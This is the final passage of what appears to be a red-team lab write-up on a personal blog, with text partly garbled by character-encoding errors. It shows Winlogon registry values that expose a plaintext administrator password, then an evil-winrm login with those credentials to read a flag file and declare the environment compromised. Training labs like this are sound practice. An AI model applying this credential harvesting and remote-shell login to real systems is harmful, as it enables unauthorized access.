<p>&lt;..SNIP..&gt;<br>ğ»ğ¾ğ¸ğ‘Œ_ğ¿ğ‘‚ğ¶ğ´ğ¿_ğ‘€ğ´ğ¶ğ»ğ¼ğ‘ğ¸\ğ‘†ğ‘‚ğ¹ğ‘‡ğ‘Šğ´ğ‘…ğ¸\ğ‘€ğ‘–ğ‘ğ‘Ÿğ‘œğ‘ ğ‘œğ‘“ğ‘¡\ğ‘Šğ‘–ğ‘›ğ‘‘ğ‘œğ‘¤ğ‘  ğ‘ğ‘‡\ğ¶ğ‘¢ğ‘Ÿğ‘Ÿğ‘’ğ‘›ğ‘¡ğ‘£ğ‘’ğ‘Ÿğ‘ ğ‘–ğ‘œğ‘›\ğ‘Šğ‘–ğ‘›ğ‘™ğ‘œğ‘”ğ‘œğ‘›<br>ğ´ğ‘¢ğ‘¡ğ‘œğ‘…ğ‘’ğ‘ ğ‘¡ğ‘ğ‘Ÿğ‘¡ğ‘†â„ğ‘’ğ‘™ğ‘™ ğ‘…ğ¸ğº_ğ·ğ‘Šğ‘‚ğ‘…ğ· 0ğ‘¥1<br>ğµğ‘ğ‘ğ‘˜ğ‘”ğ‘Ÿğ‘œğ‘¢ğ‘›ğ‘‘ ğ‘…ğ¸ğº_ğ‘†ğ‘ 0 0 0<br>ğ¶ğ‘ğ‘â„ğ‘’ğ‘‘ğ¿ğ‘œğ‘”ğ‘œğ‘›ğ‘ ğ¶ğ‘œğ‘¢ğ‘›ğ‘¡ ğ‘…ğ¸ğº_ğ‘†ğ‘ 10<br>ğ·ğ‘’ğ‘ğ‘¢ğ‘”ğ‘†ğ‘’ğ‘Ÿğ‘£ğ‘’ğ‘Ÿğ¶ğ‘œğ‘šğ‘šğ‘ğ‘›ğ‘‘ ğ‘…ğ¸ğº_ğ‘†ğ‘ ğ‘›ğ‘œ<br>ğ·ğ‘’ğ‘“ğ‘ğ‘¢ğ‘™ğ‘¡ğ‘ˆğ‘ ğ‘’ğ‘Ÿğ‘ğ‘ğ‘šğ‘’ ğ‘…ğ¸ğº_ğ‘†ğ‘ ğ‘¨ğ’…ğ’ğ’Šğ’ğ’Šğ’”ğ’•ğ’“ğ’‚ğ’•ğ’ğ’“<br>ğ·ğ‘’ğ‘“ğ‘ğ‘¢ğ‘™ğ‘¡ğ·ğ‘œğ‘šğ‘ğ‘–ğ‘›ğ‘ğ‘ğ‘šğ‘’ ğ‘…ğ¸ğº_ğ‘†ğ‘ ğ‘Šğ¼ğ‘âˆ’10âˆ’ğ‘ƒğ‘…ğ‘‚âˆ’ğ‘‹64<br>ğ´ğ‘¢ğ‘¡ğ‘œğ´ğ‘‘ğ‘šğ‘–ğ‘›ğ¿ğ‘œğ‘”ğ‘œğ‘› ğ‘…ğ¸ğº_ğ‘†ğ‘ 1<br>ğ·ğ‘’ğ‘“ğ‘ğ‘¢ğ‘™ğ‘¡ğ‘ƒğ‘ğ‘ ğ‘ ğ‘¤ğ‘œğ‘Ÿğ‘‘ ğ‘…ğ¸ğº_ğ‘†ğ‘ ğ‘»ğ’†ğ’”ğ’•@ğŸğŸğŸ‘<br>&lt;..SNIP..&gt;<br>Reconnect to the â€˜admin-sysâ€™ server with local administrator credentials.</p>
<p>./ğ‘’ğ‘£ğ‘–ğ‘™âˆ’ğ‘¤ğ‘–ğ‘›ğ‘Ÿğ‘š.ğ‘Ÿğ‘ âˆ’ğ‘– 127.0.0.1 âˆ’ğ‘¢ ğ´ğ‘‘ğ‘šğ‘–ğ‘›ğ‘–ğ‘ ğ‘¡ğ‘Ÿğ‘ğ‘¡ğ‘œğ‘Ÿ âˆ’ğ‘ ğ‘‡ğ‘’ğ‘ ğ‘¡@123<br>ğ‘¡ğ‘¦ğ‘ğ‘’ ğ¶:\ğ‘ˆğ‘ ğ‘’ğ‘Ÿğ‘ \ğ´ğ‘‘ğ‘šğ‘–ğ‘›ğ‘–ğ‘ ğ‘¡ğ‘Ÿğ‘ğ‘¡ğ‘œğ‘Ÿ\ğ·ğ‘’ğ‘ ğ‘˜ğ‘¡ğ‘œğ‘\ğ‘‡ğ‘Ÿğ‘–ğ‘¢ğ‘šğ‘â„.ğ‘¡ğ‘¥ğ‘¡</p>
<Result>
CONGRATULATIONS, YOU HAVE SUCCESSFULLY COMPROMISED MULTI-FOREST RED TEAM ENVIRONMENT!!
<3
</Result>
Congratulations!!

<p>The Multi-Forest Red Team Environment is successfully compromised.</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/killchains/">killchains</a>
                    
                  </div>
                
              </div>
              
                
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/06/22/%E6%94%BB%E5%87%BB%E9%93%BE%E5%85%AD%EF%BC%9A%E5%9F%9F%E6%B8%97%E9%80%8F%E6%A1%88%E4%BE%8B%E4%B8%89/">
                        <span class="hidden-mobile">æ”»å‡»é“¾å…­ï¼šåŸŸæ¸—é€æ¡ˆä¾‹ä¸‰</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


            

                
                  <a id="scroll-top-button" href="#" role="button">
                    <i class="iconfont icon-arrowup" aria-hidden="true"></i>
                  </a>
                  

                    
                      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
                        

                          
      </main>

      <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://whale3070.github.io/" target="_blank" rel="nofollow noopener"><span>Whale3070</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- ä¸è’œå­ç»Ÿè®¡PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            æ€»è®¿é—®é‡ 
            <span id="busuanzi_value_site_pv"></span>
             æ¬¡
          </span>
      
      
        <!-- ä¸è’œå­ç»Ÿè®¡UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            æ€»è®¿å®¢æ•° 
            <span id="busuanzi_value_site_uv"></span>
             äºº
          </span>
      
    
  </div>


  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>






  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>















<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ ä¿æŒåœ¨æœ€åº•éƒ¨ -->
<script  src="/js/boot.js" ></script>



    </body>

  </html>